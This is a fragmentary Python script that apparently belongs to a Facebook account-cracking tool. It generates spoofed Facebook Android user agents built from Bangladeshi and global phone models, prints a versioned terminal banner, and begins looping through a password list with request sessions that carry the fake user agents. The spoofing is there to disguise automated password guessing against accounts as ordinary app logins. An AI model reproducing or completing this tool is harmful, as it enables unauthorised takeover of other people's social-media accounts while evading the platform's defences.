...
def random_dalvik_ua_bd():
    fban = "FB4A"
    facebook_version = f"{random.randint(300, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 77777777))
    density = random.choice(['1.0','1.5','2.0','2.5','3.0'])
    ...
    # Popular BD Brands & Models
    brands = {
        "Xiaomi": ["Redmi Note 12","Redmi Note 11","Poco X5 Pro","Redmi 12C"],
        "Samsung": ["Galaxy A14","Galaxy A32","Galaxy M33","Galaxy A54"],
        "Realme": ["Realme C35","Realme Narzo 50","Realme 11 Pro+"],
        "Oppo": ["Oppo A57","Oppo Reno 8","Oppo A78"],
        "Vivo": ["Vivo Y21s","Vivo Y36","Vivo V29e"],
        "Infinix": ["Infinix Note 30","Infinix Hot 40i"],
        "Tecno": ["Tecno Spark 10","Tecno Camon 19"],
        "Symphony": ["Symphony Z60","Symphony Z55","Symphony i99"],
        "Walton": ["Walton Primo H10","Walton Primo RX9","Walton Primo HM6"],
        "Itel": ["Itel A60","Itel S23","Itel A70"]
    }
    ...
    # Android version realistic (Bangladesh devices normally Android 10–14)
    fbsv = f"{random.randint(10, 14)}"

    # Build numbers (commonly seen in FB logs)
    build = random.choice([
        "TP1A.220624.014","SP1A.210812.016","UP1A.231005.007",
        "TQ3A.230901.001","RQ3A.210705.001","QP1A.190711.020",
        "RKQ1.200710.003","SP2A.220305.012"
    ])
...
def random_dalvik_ua_all():
    ...
    # 🔥 All Popular Brands & Models (BD + Global)
    brands = {
        "Xiaomi": ["Redmi Note 12","Redmi Note 11","Redmi Note 10 Pro","Redmi 12C","Poco X5 Pro","Poco F5"],
        "Samsung": ["Galaxy A14","Galaxy A32","Galaxy A51","Galaxy A54","Galaxy S22 Ultra","Galaxy M33","Galaxy S23"],
        "Realme": ["Realme C35","Realme Narzo 50","Realme 8i","Realme GT Neo 3","Realme 11 Pro+","Realme 12 Pro"],
        "Oppo": ["Oppo A57","Oppo F19 Pro","Oppo Reno 8","Oppo A78","Oppo F21 Pro","Oppo Find X5"],
        "Vivo": ["Vivo Y21s","Vivo V25","Vivo Y20","Vivo Y36","Vivo V29e","Vivo Y02","Vivo X80"],
        "Infinix": ["Infinix Note 30","Infinix Zero 30","Infinix Hot 40i","Infinix Smart 8 Pro","Infinix GT 10 Pro"],
        "Tecno": ["Tecno Spark 10","Tecno Camon 19","Tecno Pova Neo","Tecno Phantom X2","Tecno Pop 7"],
        "OnePlus": ["OnePlus 9","OnePlus 10 Pro","OnePlus 11","OnePlus Nord 2T","OnePlus 12R"],
        "Google": ["Pixel 6","Pixel 6a","Pixel 7","Pixel 7 Pro","Pixel 8","Pixel 8a"],
        "Symphony": ["Symphony Z60","Symphony Z55","Symphony i99","Symphony i120","Symphony Z45"],
        "Walton": ["Walton Primo H10","Walton Primo RX9","Walton Primo GM4","Walton Primo NF5","Walton Primo HM6"],
        "Itel": ["Itel Vision 3","Itel A60","Itel S23","Itel Vision 2 Plus","Itel A70"]
    }

    # Random Brand & Model pick
    fbmf = random.choice(list(brands.keys()))
    fbbd = fbmf
    fbdv = random.choice(brands[fbmf])

    # Android version (10–14 for modern devices)
    fbsv = f"{random.randint(10, 14)}"
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 5.4
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_ua_bd(),
